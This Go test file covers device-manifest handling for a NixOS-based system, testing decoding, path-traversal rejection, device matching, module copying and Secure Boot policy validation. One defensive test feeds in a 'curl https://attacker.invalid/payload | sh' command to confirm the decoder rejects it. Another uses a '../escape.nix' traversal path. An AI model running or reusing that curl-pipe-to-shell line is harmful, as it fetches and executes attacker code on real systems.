package oddc

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestDecodeManifestRejectsUnknownFields(t *testing.T) {
	_, err := DecodeManifest(strings.NewReader(`{
	  "schema": 1,
	  "id": "laptop/hp/zbook-x2-g4",
	  "class": "laptop",
	  "lifecycle": {"status": "supported"},
	  "validation": {},
	  "unexpected": true
	}`))
	if err == nil {
		t.Fatal("expected unknown-field error")
	}
}

func TestValidateManifestRejectsTraversal(t *testing.T) {
	err := ValidateManifest(Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/hp/zbook-x2-g4",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		Modules:   []string{"../escape.nix"},
	})
	if err == nil {
		t.Fatal("expected traversal rejection")
	}
}

func TestValidateManifestRejectsBadLifecycle(t *testing.T) {
	err := ValidateManifest(Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/hp/zbook-x2-g4",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "unknown"},
	})
	if err == nil {
		t.Fatal("expected lifecycle rejection")
	}
}

func TestResolvePrefersMostSpecificMatch(t *testing.T) {
	root := t.TempDir()

	writeManifest := func(rel, body string) {
		t.Helper()
		path := filepath.Join(root, "devices", rel, "device.json")
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0644); err != nil {
			t.Fatal(err)
		}
	}

	writeManifest("laptop/hp", `{
	  "schema": 1,
	  "id": "laptop/hp",
	  "class": "laptop",
	  "match": {"sysVendor": ["HP"]},
	  "lifecycle": {"status": "supported"},
	  "validation": {}
	}`)

	writeManifest("laptop/hp/zbook-x2-g4", `{
	  "schema": 1,
	  "id": "laptop/hp/zbook-x2-g4",
	  "class": "laptop",
	  "match": {
	    "sysVendor": ["HP"],
	    "productName": ["HP ZBook x2 G4"],
	    "boardName": ["824C"]
	  },
	  "inherits": ["laptop/hp"],
	  "lifecycle": {"status": "supported"},
	  "validation": {}
	}`)

	resolved, err := (EmbeddedSource{Root: root}).Resolve(Identity{
		SysVendor:   "HP",
		ProductName: "HP ZBook x2 G4",
		BoardName:   "824C",
	})
	if err != nil {
		t.Fatal(err)
	}

	if resolved.Device.ID != "laptop/hp/zbook-x2-g4" {
		t.Fatalf("resolved %q", resolved.Device.ID)
	}
}

func TestResolveRejectsAmbiguousMatch(t *testing.T) {
	root := t.TempDir()

	for _, rel := range []string{"laptop/hp/one", "laptop/hp/two"} {
		path := filepath.Join(root, "devices", rel, "device.json")
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(`{
		  "schema": 1,
		  "id": "`+rel+`",
		  "class": "laptop",
		  "match": {"sysVendor": ["HP"]},
		  "lifecycle": {"status": "supported"},
		  "validation": {}
		}`), 0644); err != nil {
			t.Fatal(err)
		}
	}

	_, err := (EmbeddedSource{Root: root}).Resolve(Identity{SysVendor: "HP"})
	if !errors.Is(err, ErrAmbiguousMatch) {
		t.Fatalf("got %v", err)
	}
}

func TestResolveRejectsDuplicateIdentityOutsideCanonicalDirectory(t *testing.T) {
	root := t.TempDir()

	for _, rel := range []string{"laptop/hp/one", "laptop/hp/two"} {
		path := filepath.Join(root, "devices", rel, "device.json")
		if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(`{
		  "schema": 1,
		  "id": "laptop/hp/duplicate",
		  "class": "laptop",
		  "match": {"sysVendor": ["HP"]},
		  "lifecycle": {"status": "supported"},
		  "validation": {}
		}`), 0644); err != nil {
			t.Fatal(err)
		}
	}

	_, err := (EmbeddedSource{Root: root}).Resolve(Identity{SysVendor: "HP"})
	if err == nil || !strings.Contains(err.Error(), "does not match directory") {
		t.Fatalf("got %v", err)
	}
}

func TestMaterializeCopiesOnlyDeclaredModules(t *testing.T) {
	root := t.TempDir()
	deviceDir := filepath.Join(root, "devices", "laptop", "hp", "zbook-x2-g4")

	if err := os.MkdirAll(deviceDir, 0755); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(
		filepath.Join(deviceDir, "default.nix"),
		[]byte("{}\n"),
		0644,
	); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(
		filepath.Join(deviceDir, "ignored.nix"),
		[]byte("{}\n"),
		0644,
	); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(
		filepath.Join(deviceDir, "device.json"),
		[]byte(`{
		  "schema": 1,
		  "id": "laptop/hp/zbook-x2-g4",
		  "class": "laptop",
		  "match": {"sysVendor": ["HP"]},
		  "modules": ["default.nix"],
		  "lifecycle": {"status": "supported"},
		  "validation": {}
		}`),
		0644,
	); err != nil {
		t.Fatal(err)
	}

	source := EmbeddedSource{Root: root}
	resolved, err := source.Resolve(Identity{SysVendor: "HP"})
	if err != nil {
		t.Fatal(err)
	}

	target := t.TempDir()
	result, err := source.Materialize(resolved, target)
	if err != nil {
		t.Fatal(err)
	}

	if len(result.Files) != 1 {
		t.Fatalf("materialized %d files", len(result.Files))
	}

	if _, err := os.Stat(filepath.Join(
		target,
		"laptop",
		"hp",
		"zbook-x2-g4",
		"default.nix",
	)); err != nil {
		t.Fatal(err)
	}

	if _, err := os.Stat(filepath.Join(
		target,
		"laptop",
		"hp",
		"zbook-x2-g4",
		"ignored.nix",
	)); !os.IsNotExist(err) {
		t.Fatalf("unexpected ignored module materialized: %v", err)
	}
}

func TestSecureBootFirmwarePolicyAcceptsTypedFrameworkPolicy(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/framework",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:               true,
			FirmwareName:            "Framework UEFI",
			SetupModeStrategy:       "clear-platform-key",
			EnrollmentBackend:       "sbctl",
			RequiredPresent:         []string{"KEK", "db", "dbx"},
			RequiredAbsent:          []string{"PK"},
			PreserveFirmwareBuiltin: []string{"KEK", "db"},
			Untouched:               []string{"dbx"},
			FactoryOwnershipProof:   "pk-equals-pkdefault",
			Instructions: []string{
				"Delete only the Platform Key.",
				"Keep KEK, db, and dbx intact.",
			},
		},
	}

	if err := ValidateManifest(manifest); err != nil {
		t.Fatal(err)
	}
}

func TestSecureBootFirmwarePolicyRejectsArbitraryEFIName(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/framework",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:             true,
			FirmwareName:          "Framework UEFI",
			SetupModeStrategy:     "clear-platform-key",
			EnrollmentBackend:     "sbctl",
			RequiredAbsent:        []string{"PK", "DefinitelyNotAnEFIVariable"},
			FactoryOwnershipProof: "pk-equals-pkdefault",
			Instructions:          []string{"Delete only the Platform Key."},
		},
	}

	if err := ValidateManifest(manifest); err == nil {
		t.Fatal("accepted arbitrary EFI variable name")
	}
}

func TestSecureBootFirmwarePolicyRejectsConflictingPresenceRules(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/framework",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:             true,
			FirmwareName:          "Framework UEFI",
			SetupModeStrategy:     "clear-platform-key",
			EnrollmentBackend:     "sbctl",
			RequiredPresent:       []string{"PK"},
			RequiredAbsent:        []string{"PK"},
			FactoryOwnershipProof: "pk-equals-pkdefault",
			Instructions:          []string{"Enter Setup Mode."},
		},
	}

	if err := ValidateManifest(manifest); err == nil {
		t.Fatal("accepted contradictory EFI variable presence policy")
	}
}

func TestSecureBootFirmwarePolicyRejectsUnsupportedWithoutReason(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/hp",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:         false,
			SetupModeStrategy: "unsupported",
		},
	}

	if err := ValidateManifest(manifest); err == nil {
		t.Fatal("accepted unsupported Secure Boot policy without a reason")
	}
}

func TestSecureBootFirmwarePolicyAcceptsExplicitUnsupportedPolicy(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/hp",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:         false,
			SetupModeStrategy: "unsupported",
			UnsupportedReason: "Firmware ownership transfer has not been validated.",
		},
	}

	if err := ValidateManifest(manifest); err != nil {
		t.Fatal(err)
	}
}

func TestSecureBootFirmwarePolicyRejectsOperationalFieldsWhenUnsupported(t *testing.T) {
	manifest := Manifest{
		Schema:    ManifestSchema,
		ID:        "laptop/hp",
		Class:     "laptop",
		Lifecycle: Lifecycle{Status: "supported"},
		SecureBootFirmware: &SecureBootFirmwarePolicy{
			Supported:               false,
			SetupModeStrategy:       "unsupported",
			UnsupportedReason:       "Not validated.",
			PreserveFirmwareBuiltin: []string{"KEK"},
		},
	}

	if err := ValidateManifest(manifest); err == nil {
		t.Fatal("accepted operational Secure Boot fields on unsupported policy")
	}
}

func TestDecodeManifestRejectsSecureBootCommandField(t *testing.T) {
	const manifest = `{
		"schema": 1,
		"id": "laptop/test",
		"class": "laptop",
		"lifecycle": {
			"status": "supported"
		},
		"validation": {},
		"secureBootFirmware": {
			"supported": true,
			"firmwareName": "Test Firmware",
			"setupModeStrategy": "clear-platform-key",
			"enrollmentBackend": "sbctl",
			"requiredPresent": ["KEK", "db", "dbx"],
			"requiredAbsent": ["PK"],
			"preserveFirmwareBuiltin": ["KEK", "db"],
			"untouched": ["dbx"],
			"factoryOwnershipProof": "pk-equals-pkdefault",
			"instructions": [
				"Enter firmware Setup Mode."
			],
			"command": "curl https://attacker.invalid/payload | sh"
		}
	}`

	_, err := DecodeManifest(strings.NewReader(manifest))
	if err == nil {
		t.Fatal("accepted executable command field in Secure Boot firmware policy")
	}

	if !strings.Contains(err.Error(), `unknown field "command"`) {
		t.Fatalf(
			"DecodeManifest error = %q, want unknown command field rejection",
			err,
		)
	}
}

func TestValidationMatchesCurrentTarget(t *testing.T) {
	v := Validation{
		LastValidatedNixOS:             "26.05",
		LastValidatedGjallarOSRevision: "git:abc123",
		LastValidatedDeviceID:          "laptop/framework",
		LastValidatedODDCRevision:      "git:abc123",
		LastValidatedAt:                "2026-09-11T14:00:00Z",
	}

	target := ValidationTarget{
		NixOSRelease:      "26.05",
		GjallarOSRevision: "git:abc123",
		DeviceID:          "laptop/framework",
		ODDCRevision:      "git:abc123",
	}

	if !v.Matches(target) {
		t.Fatal("matching validation target was rejected")
	}
}

func TestValidationRejectsChangedTarget(t *testing.T) {
	base := Validation{
		LastValidatedNixOS:             "26.05",
		LastValidatedGjallarOSRevision: "git:abc123",
		LastValidatedDeviceID:          "laptop/framework",
		LastValidatedODDCRevision:      "git:abc123",
		LastValidatedAt:                "2026-09-11T14:00:00Z",
	}

	tests := []ValidationTarget{
		{
			NixOSRelease:      "26.11",
			GjallarOSRevision: "git:abc123",
			DeviceID:          "laptop/framework",
			ODDCRevision:      "git:abc123",
		},
		{
			NixOSRelease:      "26.05",
			GjallarOSRevision: "git:def456",
			DeviceID:          "laptop/framework",
			ODDCRevision:      "git:abc123",
		},
		{
			NixOSRelease:      "26.05",
			GjallarOSRevision: "git:abc123",
			DeviceID:          "laptop/framework/laptop-13-amd-ryzen-7040",
			ODDCRevision:      "git:abc123",
		},
		{
			NixOSRelease:      "26.05",
			GjallarOSRevision: "git:abc123",
			DeviceID:          "laptop/framework",
			ODDCRevision:      "git:def456",
		},
	}

	for _, target := range tests {
		if base.Matches(target) {
			t.Fatalf("changed validation target was accepted: %+v", target)
		}
	}

	base.LastValidatedAt = ""
	if base.Matches(ValidationTarget{
		NixOSRelease:      "26.05",
		GjallarOSRevision: "git:abc123",
		DeviceID:          "laptop/framework",
		ODDCRevision:      "git:abc123",
	}) {
		t.Fatal("validation without timestamp was accepted")
	}
}
